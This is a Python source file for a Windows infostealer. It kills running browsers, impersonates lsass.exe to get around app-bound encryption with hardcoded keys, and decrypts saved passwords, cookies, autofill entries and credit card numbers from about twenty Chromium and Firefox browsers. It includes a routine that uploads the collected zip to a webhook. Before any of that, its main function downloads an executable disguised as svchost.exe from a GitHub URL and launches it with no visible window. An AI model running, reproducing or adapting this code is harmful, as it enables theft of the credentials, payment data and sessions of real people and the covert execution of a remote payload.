# -*- coding: utf-8 -*-
import os
import argparse
import io
import json
import struct
import ctypes
import shutil
import sqlite3
import pathlib
import binascii
import subprocess
import time
from io import BytesIO
import multiprocessing
import sys
import time
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

def restart_on_error(e):
    err_msg = str(e)
    print(f"[!] Hata yakalandi: {err_msg}")
    print("[*] Kod 2 saniye icinde yeniden baslatiliyor...")
    time.sleep(2)
    os.execv(sys.executable, [sys.executable] + sys.argv)

try:
    import windows
    import windows.crypto
    import windows.security
    import windows.generated_def as gdef
except Exception as e:
    restart_on_error(e)
    raise e

from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305
import urllib.request
import urllib.parse
import hashlib
import hmac
from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad
import base64

multiprocessing.freeze_support()

BROWSERS = {
    'chrome': {
        'name': 'Google Chrome',
        'data_path': r'AppData\Local\Google\Chrome\User Data',
        'local_state': r'AppData\Local\Google\Chrome\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chromekey1',
        'chromium_based': True
    },
    'brave': {
        'name': 'Brave',
        'data_path': r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
        'local_state': r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
        'process_name': 'brave.exe',
        'key_name': 'Brave Softwarekey1',
        'chromium_based': True
    },
    'edge': {
        'name': 'Microsoft Edge',
        'data_path': r'AppData\Local\Microsoft\Edge\User Data',
        'local_state': r'AppData\Local\Microsoft\Edge\User Data\Local State',
        'process_name': 'msedge.exe',
        'key_name': 'Microsoft Edgekey1',
        'chromium_based': True
    },
    'opera': {
        'name': 'Opera',
        'data_path': r'AppData\Roaming\Opera Software\Opera Stable',
        'local_state': r'AppData\Roaming\Opera Software\Opera Stable\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1',
        'chromium_based': True
    },
    'opera_gx': {
        'name': 'Opera GX',
        'data_path': r'AppData\Roaming\Opera Software\Opera GX Stable',
        'local_state': r'AppData\Roaming\Opera Software\Opera GX Stable\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1',
        'chromium_based': True
    },
    'yandex': {
        'name': 'Yandex Browser',
        'data_path': r'AppData\Local\Yandex\YandexBrowser\User Data',
        'local_state': r'AppData\Local\Yandex\YandexBrowser\User Data\Local State',
        'process_name': 'browser.exe',
        'key_name': 'Yandex Browserkey1',
        'chromium_based': True
    },
    'vivaldi': {
        'name': 'Vivaldi',
        'data_path': r'AppData\Local\Vivaldi\User Data',
        'local_state': r'AppData\Local\Vivaldi\User Data\Local State',
        'process_name': 'vivaldi.exe',
        'key_name': 'Vivaldikey1',
        'chromium_based': True
    },
    'chromium': {
        'name': 'Chromium',
        'data_path': r'AppData\Local\Chromium\User Data',
        'local_state': r'AppData\Local\Chromium\User Data\Local State',
        'process_name': 'chromium.exe',
        'key_name': 'Chromiumkey1',
        'chromium_based': True
    },
    'sputnik': {
        'name': 'Sputnik',
        'data_path': r'AppData\Local\Sputnik\Sputnik\User Data',
        'local_state': r'AppData\Local\Sputnik\Sputnik\User Data\Local State',
        'process_name': 'browser.exe',
        'key_name': 'Sputnikkey1',
        'chromium_based': True
    },
    '7star': {
        'name': '7Star',
        'data_path': r'AppData\Local\7Star\7Star\User Data',
        'local_state': r'AppData\Local\7Star\7Star\User Data\Local State',
        'process_name': '7star.exe',
        'key_name': '7Starkey1',
        'chromium_based': True
    },
    'orbitum': {
        'name': 'Orbitum',
        'data_path': r'AppData\Local\Orbitum\User Data',
        'local_state': r'AppData\Local\Orbitum\User Data\Local State',
        'process_name': 'orbitum.exe',
        'key_name': 'Orbitumkey1',
        'chromium_based': True
    },
    'epic': {
        'name': 'Epic Privacy Browser',
        'data_path': r'AppData\Local\Epic Privacy Browser\User Data',
        'local_state': r'AppData\Local\Epic Privacy Browser\User Data\Local State',
        'process_name': 'epic.exe',
        'key_name': 'Epic Privacy Browserkey1',
        'chromium_based': True
    },
    'amigo': {
        'name': 'Amigo',
        'data_path': r'AppData\Local\Amigo\User Data',
        'local_state': r'AppData\Local\Amigo\User Data\Local State',
        'process_name': 'amigo.exe',
        'key_name': 'Amigokey1',
        'chromium_based': True
    },
    'torch': {
        'name': 'Torch',
        'data_path': r'AppData\Local\Torch\User Data',
        'local_state': r'AppData\Local\Torch\User Data\Local State',
        'process_name': 'torch.exe',
        'key_name': 'Torchkey1',
        'chromium_based': True
    },
    'kometa': {
        'name': 'Kometa',
        'data_path': r'AppData\Local\Kometa\User Data',
        'local_state': r'AppData\Local\Kometa\User Data\Local State',
        'process_name': 'kometa.exe',
        'key_name': 'Kometakey1',
        'chromium_based': True
    },
    'coccoc': {
        'name': 'CocCoc Browser',
        'data_path': r'AppData\Local\CocCoc\Browser\User Data',
        'local_state': r'AppData\Local\CocCoc\Browser\User Data\Local State',
        'process_name': 'browser.exe',
        'key_name': 'CocCoc Browserkey1',
        'chromium_based': True
    },
    'qq': {
        'name': 'QQ Browser',
        'data_path': r'AppData\Local\Tencent\QQBrowser\User Data',
        'local_state': r'AppData\Local\Tencent\QQBrowser\User Data\Local State',
        'process_name': 'QQBrowser.exe',
        'key_name': 'QQ Browserkey1',
        'chromium_based': True
    },
    '360speed': {
        'name': '360 Speed',
        'data_path': r'AppData\Local\360Chrome\Chrome\User Data',
        'local_state': r'AppData\Local\360Chrome\Chrome\User Data\Local State',
        'process_name': '360chrome.exe',
        'key_name': '360 Speedkey1',
        'chromium_based': True
    },
    'firefox': {
        'name': 'Mozilla Firefox',
        'data_path': r'AppData\Roaming\Mozilla\Firefox\Profiles',
        'local_state': None,
        'process_name': 'firefox.exe',
        'chromium_based': False
    },
    'tor': {
        'name': 'Tor Browser',
        'data_path': r'AppData\Roaming\tor-browser\Browser\TorBrowser\Data\Browser\Profiles',
        'local_state': None,
        'process_name': 'firefox.exe',
        'chromium_based': False
    }
}

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def kill_browser_processes():
    import psutil
    browsers_killed = []
    for config in BROWSERS.values():
        process_name = config['process_name']
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
                        proc.kill()
                        browsers_killed.append(process_name)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
        except:
            pass
    if browsers_killed:
        print(f"[*] Browsers killed: {', '.join(set(browsers_killed))}")
        time.sleep(2)

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name.lower() == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    except:
        pass
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['flag'] = buffer.read(1)[0]
    if parsed_data['flag'] in (1, 2):
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        parsed_data['raw_data'] = buffer.read()
    return parsed_data

def decrypt_with_cng(input_data, key_name):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), "Microsoft Software Key Storage Provider", 0)
    if status != 0:
        return None
    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    if status != 0:
        print(f"[!] NCryptOpenKey error: {status} (Key: {key_name})")
        ncrypt.NCryptFreeObject(hProvider)
        return None
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    if status != 0:
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        return None
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * buffer_size)()
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
                                 ctypes.byref(pcbResult), 0x40)
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    if status != 0:
        return None
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes(a ^ b for a, b in zip(ba1, ba2))

def derive_v20_master_key(parsed_data: dict, key_name) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    elif parsed_data['flag'] == 2:
        chacha_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha_key, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            dec_aes = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
            if not dec_aes:
                return None
        xored = byte_xor(dec_aes, xor_key)
        cipher = AES.new(xored, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    else:
        return parsed_data.get('raw_data', b'')

def decrypt_v20_value(encrypted_value: bytes, master_key: bytes) -> str:
    try:
        if not encrypted_value:
            return ""
        if encrypted_value[:3] in (b'v10', b'v11', b'v20'):
            try:
                iv = encrypted_value[3:15]
                payload = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                decrypted = cipher.decrypt_and_verify(payload, tag)
                return decrypted[32:].decode('utf-8', errors='replace')
            except:
                if encrypted_value[:3] == b'v10':
                    return windows.crypto.dpapi.unprotect(encrypted_value[3:]).decode('utf-8', errors='replace')
        return "DECRYPT_FAILED"
    except:
        return "DECRYPT_FAILED"

def decrypt_v20_password(encrypted_value: bytes, master_key: bytes) -> str:
    try:
        if not encrypted_value:
            return ""
        if encrypted_value[:3] in (b'v10', b'v11', b'v20'):
            try:
                iv = encrypted_value[3:15]
                payload = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                decrypted = cipher.decrypt_and_verify(payload, tag)
                return decrypted.decode('utf-8', errors='replace')
            except:
                if encrypted_value[:3] == b'v10':
                    return windows.crypto.dpapi.unprotect(encrypted_value[3:]).decode('utf-8', errors='replace')
        return "NOT_V20_OR_V10"
    except:
        return "DECRYPT_FAILED"

def extract_bookmarks(profile_path):
    bookmarks_path = profile_path / "Bookmarks"
    if not bookmarks_path.exists():
        return []
    try:
        with open(bookmarks_path, "r", encoding="utf-8", errors='ignore') as f:
            data = json.load(f)
        bookmarks = []
        def process_node(node):
            if isinstance(node, dict):
                if node.get("type") == "url":
                    bookmarks.append(f"{node.get('name', 'Unknown')}\t{node.get('url', 'Unknown')}")
                if "children" in node:
                    for child in node["children"]:
                        process_node(child)
        if "roots" in data:
            for root in data["roots"].values():
                process_node(root)
        return bookmarks
    except:
        return []

def extract_history(profile_path):
    history_db = profile_path / "History"
    if not history_db.exists():
        return []
    db_copy = fetch_sqlite_copy(history_db)
    if not db_copy:
        return []
    try:
        con = sqlite3.connect(str(db_copy))
        cur = con.cursor()
        cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
        rows = cur.fetchall()
        con.close()
        os.unlink(db_copy)
        history_items = []
        for url, title, visit_count, last_visit in rows:
            try:
                dt = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(last_visit/1000000 - 11644473600))
            except:
                dt = "Unknown"
            history_items.append(f"{url}\t{title}\t{visit_count}\t{dt}")
        return history_items
    except:
        if db_copy.exists(): os.unlink(db_copy)
        return []

def fetch_sqlite_copy(db_path: pathlib.Path):
    if not db_path.exists():
        return None
    tmp_name = f"tmp_{os.urandom(8).hex()}_{db_path.name}"
    tmp_path = pathlib.Path(os.environ['TEMP']) / tmp_name
    try:
        shutil.copy2(db_path, tmp_path)
        return tmp_path
    except:
        return None

def get_master_key(config):
    if not config.get('local_state'):
        return None
    try:
        user_profile = os.environ['USERPROFILE']
        local_state_path = pathlib.Path(user_profile) / config['local_state']
        if not local_state_path.exists():
            return None
        with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
            local_state = json.load(f)
        if 'os_crypt' not in local_state:
            return None
        if 'app_bound_encrypted_key' in local_state['os_crypt']:
            enc_key = binascii.a2b_base64(local_state['os_crypt']['app_bound_encrypted_key'])[4:]
        elif 'encrypted_key' in local_state['os_crypt']:
            enc_key = binascii.a2b_base64(local_state['os_crypt']['encrypted_key'])[5:]
            return windows.crypto.dpapi.unprotect(enc_key)
        else:
            return None
        try:
            with impersonate_lsass():
                system_dec = windows.crypto.dpapi.unprotect(enc_key)
            user_dec = windows.crypto.dpapi.unprotect(system_dec)
            parsed = parse_key_blob(user_dec)
            if parsed['flag'] not in (1, 2, 3):
                return user_dec[-32:]
            return derive_v20_master_key(parsed, config['key_name'])
        except Exception as inner_e:
            print(f"[!] Master Key decryption error ({config['name']}): {inner_e}")
            return None
    except Exception as e:
        print(f"[!] Master Key retrieval error ({config['name']}): {e}")
        return None

def write_to_file(base_path: str, rel_path: str, content: str):
    if content.strip():
        full_path = os.path.join(base_path, rel_path)
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        with open(full_path, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f"[+] File saved: {rel_path}")

def process_chromium_browser(browser_name, config, master_key, base_path):
    user_profile = os.environ['USERPROFILE']
    data_path = pathlib.Path(user_profile) / config['data_path']
    if not data_path.exists():
        return
    potential_profiles = [p for p in data_path.iterdir() if p.is_dir()]
    profiles = []
    valid_indicators = ["Login Data", "Web Data", "Cookies", "History", "Network"]
    for p in potential_profiles:
        if p.name == "Default" or p.name.startswith("Profile") or any((p / ind).exists() for ind in valid_indicators):
            profiles.append(p)
    if not profiles and (data_path / "Login Data").exists():
        profiles = [data_path]
    for profile_dir in profiles:
        profile_name = profile_dir.name
        print(f"  [>] Processing profile: {profile_name}")
        prefix = f"{browser_name}/{profile_name}/"
        bookmarks = extract_bookmarks(profile_dir)
        if bookmarks:
            print(f"    [+] Found {len(bookmarks)} bookmarks.")
            write_to_file(base_path, prefix + "bookmarks.txt", "# Name\tURL\n" + "\n".join(bookmarks))
        history = extract_history(profile_dir)
        if history:
            print(f"    [+] Found {len(history)} history records.")
            write_to_file(base_path, prefix + "history.txt", "# URL\tTitle\tVisit Count\tLast Visit\n" + "\n".join(history))
        
        passwords_count = 0
        passwords_content = ""
        login_db = profile_dir / "Login Data"
        if login_db.exists():
            tmp_db = fetch_sqlite_copy(login_db)
            if tmp_db:
                try:
                    con = sqlite3.connect(str(tmp_db))
                    cur = con.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, user, pw in cur.fetchall():
                        if pw:
                            dec = None
                            if pw[:3] in (b'v10', b'v11', b'v20'):
                                dec = decrypt_v20_password(pw, master_key)
                                if dec in ("DECRYPT_FAILED", "NOT_V20_OR_V10"): dec = None
                            elif pw[:3] == b'v10' and not master_key:
                                try:
                                    dec = windows.crypto.dpapi.unprotect(pw[3:]).decode('utf-8', errors='replace')
                                except: dec = None
                            
                            if dec:
                                passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
                                passwords_count += 1
                    con.close()
                    if passwords_content.strip():
                        print(f"    [+] Found {passwords_count} passwords.")
                        write_to_file(base_path, prefix + "passwords.txt", passwords_content)
                except: pass
                if tmp_db.exists(): os.unlink(tmp_db)
        
        cookies_count = 0
        cookies_content = ""
        cookies_db = profile_dir / "Network" / "Cookies"
        if not cookies_db.exists():
            cookies_db = profile_dir / "Cookies"
        if cookies_db.exists():
            tmp_db = fetch_sqlite_copy(cookies_db)
            if tmp_db:
                try:
                    con = sqlite3.connect(str(tmp_db))
                    cur = con.cursor()
                    cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies")
                    for host, name, path, exp, sec, httpo, enc in cur.fetchall():
                        if enc and enc[:3] in (b'v10', b'v11', b'v20'):
                            dec = decrypt_v20_value(enc, master_key)
                            if dec and dec != "DECRYPT_FAILED":
                                cookies_count += 1
                                flag = "TRUE" if (host and host.startswith('.')) else "FALSE"
                                secure_str = "TRUE" if sec else "FALSE"
                                try:
                                    unix_exp = int(exp) // 1000000 - 11644473600 if int(exp) > 11644473600*1000000 else 0
                                except: unix_exp = 0
                                line = f"{host}\t{flag}\t{path}\t{secure_str}\t{unix_exp}\t{name}\t{dec}\n"
                                cookies_content += line
                    con.close()
                    if cookies_content.strip():
                        print(f"    [+] Found {cookies_count} cookies.")
                        write_to_file(base_path, prefix + "cookies.txt", "# Netscape HTTP Cookie File\n" + cookies_content)
                except: pass
                if tmp_db.exists(): os.unlink(tmp_db)
        
        autofill_count = 0
        autofill_content = ""
        credit_cards_count = 0
        credit_cards_content = ""
        webdata_db = profile_dir / "Web Data"
        if webdata_db.exists():
            tmp_db = fetch_sqlite_copy(webdata_db)
            if tmp_db:
                try:
                    con = sqlite3.connect(str(tmp_db))
                    cur = con.cursor()
                    try:
                        cur.execute("SELECT name, value FROM autofill")
                        for name, val in cur.fetchall():
                            if name:
                                if isinstance(val, bytes) and val[:3] in (b'v10', b'v11', b'v20'):
                                    dec = decrypt_v20_value(val, master_key)
                                else: dec = str(val) if val else ""
                                autofill_content += f"Field: {name}\nValue: {dec}\n\n"
                                autofill_count += 1
                    except: pass
                    try:
                        cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                        for name, exp_m, exp_y, enc_num in cur.fetchall():
                            dec_num = "Unknown"
                            if enc_num and enc_num[:3] in (b'v10', b'v11', b'v20'):
                                dec_num = decrypt_v20_password(enc_num, master_key)
                            credit_cards_content += f"Name: {name}\nExp: {exp_m}/{exp_y}\nNumber: {dec_num}\n\n"
                            credit_cards_count += 1
                    except: pass
                    con.close()
                    if autofill_content:
                        print(f"    [+] Found {autofill_count} autofill records.")
                        write_to_file(base_path, prefix + "auto_fills.txt", autofill_content)
                    if credit_cards_content:
                        print(f"    [+] Found {credit_cards_count} credit cards.")
                        write_to_file(base_path, prefix + "credit_cards.txt", credit_cards_content)
                except Exception as e:
                    print(f"[!] Database error for profile {profile_name}: {e}")
                if tmp_db.exists(): os.unlink(tmp_db)

def process_firefox_browser(browser_name, config, base_path):
    user_profile = os.environ['USERPROFILE']
    profiles_path = pathlib.Path(user_profile) / config['data_path']
    if not profiles_path.exists(): return
    class SECItem(ctypes.Structure):
        _fields_ = [('type', ctypes.c_uint), ('data', ctypes.c_void_p), ('len', ctypes.c_uint)]
    nss_dll = None
    for p in [r"C:\Program Files\Mozilla Firefox\nss3.dll", r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll"]:
        if os.path.exists(p):
            try: nss_dll = ctypes.CDLL(p); break
            except: pass
    profile_dirs = [p for p in profiles_path.iterdir() if p.is_dir() and ('default' in p.name.lower() or 'release' in p.name.lower() or 'beta' in p.name.lower())]
    for profile_dir in profile_dirs:
        print(f"  [>] Processing profile (Firefox): {profile_dir.name}")
        prefix = f"{browser_name}/{profile_dir.name}/"
        cookies_count = 0
        cookies_content = ""
        cookies_db = profile_dir / "cookies.sqlite"
        if cookies_db.exists():
            try:
                con = sqlite3.connect(str(cookies_db))
                cur = con.cursor()
                cur.execute("SELECT host, name, value, path, expiry, isSecure FROM moz_cookies")
                for host, name, value, path, expiry, secure in cur.fetchall():
                    cookies_count += 1
                    cookies_content += f"{host}\tTRUE\t{path}\t{str(bool(secure)).upper()}\t{expiry}\t{name}\t{value}\n"
                con.close()
                if cookies_content:
                    print(f"    [+] Found {cookies_count} cookies.")
                    write_to_file(base_path, prefix + "cookies.txt", cookies_content)
            except: pass
        passwords_count = 0
        passwords_content = ""
        logins_json = profile_dir / "logins.json"
        if logins_json.exists(): 
            try:
                dest = os.path.join(base_path, prefix, "raw/logins.json")
                os.makedirs(os.path.dirname(dest), exist_ok=True)
                shutil.copy2(logins_json, dest)
            except: pass
        if (profile_dir / "key4.db").exists():
            try:
                dest = os.path.join(base_path, prefix, "raw/key4.db")
                os.makedirs(os.path.dirname(dest), exist_ok=True)
                shutil.copy2(profile_dir / "key4.db", dest)
            except: pass
        if logins_json.exists() and nss_dll:
            try:
                if nss_dll.NSS_Init(str(profile_dir).encode('utf-8')) == 0:
                    with open(logins_json, "r", encoding="utf-8") as f:
                        data = json.load(f)
                    for entry in data.get("logins", []):
                        url = entry.get('hostname', '')
                        user = entry.get('username', '')
                        enc_pass = entry.get('encryptedPassword', entry.get('password', ''))
                        decrypted = "Failed to decrypt"
                        if enc_pass:
                            try:
                                dec_data = base64.b64decode(enc_pass)
                                inp = SECItem(0, ctypes.cast(ctypes.create_string_buffer(dec_data), ctypes.c_void_p), len(dec_data))
                                out = SECItem(0, 0, 0)
                                if nss_dll.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None) == 0:
                                    decrypted = ctypes.string_at(out.data, out.len).decode('utf-8')
                                    passwords_count += 1
                            except: pass
                        passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {decrypted}\n\n"
                    nss_dll.NSS_Shutdown()
            except: pass
        if not passwords_content and logins_json.exists():
            try:
                with open(logins_json, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for entry in data.get("logins", []):
                    passwords_content += f"URL: {entry.get('hostname')}\nUser: {entry.get('username')}\nPass: {entry.get('encryptedPassword')} (Encrypted - NSS DLL missing)\n\n"
            except: pass
        if passwords_content.strip():
            if passwords_count > 0:
                print(f"    [+] Decrypted {passwords_count} passwords.")
            else:
                print(f"    [+] Passwords found (not decrypted, raw data saved).")
            write_to_file(base_path, prefix + "passwords.txt", passwords_content)

def send_to_webhook(zip_path, webhook_url):
    if not os.path.exists(zip_path):
        return
    try:
        boundary = '----WebKitFormBoundary' + binascii.hexlify(os.urandom(16)).decode('ascii')
        with open(zip_path, 'rb') as f:
            file_content = f.read()
        body = []
        body.append(f'--{boundary}'.encode('utf-8'))
        body.append(f'Content-Disposition: form-data; name="file"; filename="browsers.zip"'.encode('utf-8'))
        body.append('Content-Type: application/zip'.encode('utf-8'))
        body.append(b'')
        body.append(file_content)
        body.append(f'--{boundary}--'.encode('utf-8'))
        body.append(b'')
        body_bytes = b'\r\n'.join(body)
        req = urllib.request.Request(webhook_url, data=body_bytes)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        req.add_header('User-Agent', 'Mozilla/5.0')
        with urllib.request.urlopen(req) as response:
            pass
    except:
        pass

def download_and_run_svchost():
    url = "https://github.com/erayx069-ux/extractor/raw/refs/heads/main/svchost.exe"
    temp_dir = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'crash_x90213x')
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)
    
    file_path = os.path.join(temp_dir, "svchost.exe")
    
    try:
        print("[*] Downloading svchost.exe...")
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            with open(file_path, "wb") as f:
                f.write(response.read())
        
        print("[*] Starting svchost.exe...")
        subprocess.Popen([file_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
        print(f"[+] svchost.exe started: {file_path}")
    except Exception as e:
        print(f"[!] svchost.exe download/run error: {e}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('mode', nargs='?', default='all')
    parser.add_argument('--fingerprint', action='store_true')
    parser.add_argument('--output-path', required=False)
    args = parser.parse_args()

    download_and_run_svchost()

    print("[*] Browser data collection started...")
    kill_browser_processes()
    time.sleep(1)
    out = args.output_path if args.output_path else "output"
    if not os.path.exists(out): os.makedirs(out, exist_ok=True)
    for n, c in BROWSERS.items():
        print(f"[*] Processing: {c['name']}")
        try:
            if c['chromium_based']:
                mk = get_master_key(c)
                if mk: 
                    process_chromium_browser(n, c, mk, out)
                else:
                    print(f"[!] Master Key not found for {c['name']}.")
            else:
                process_firefox_browser(n, c, out)
        except Exception as e:
            print(f"[!] Error processing {c['name']}: {e}")
    print("[*] Operation completed. Data saved to 'output' folder.")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        restart_on_error(e)
        raise e
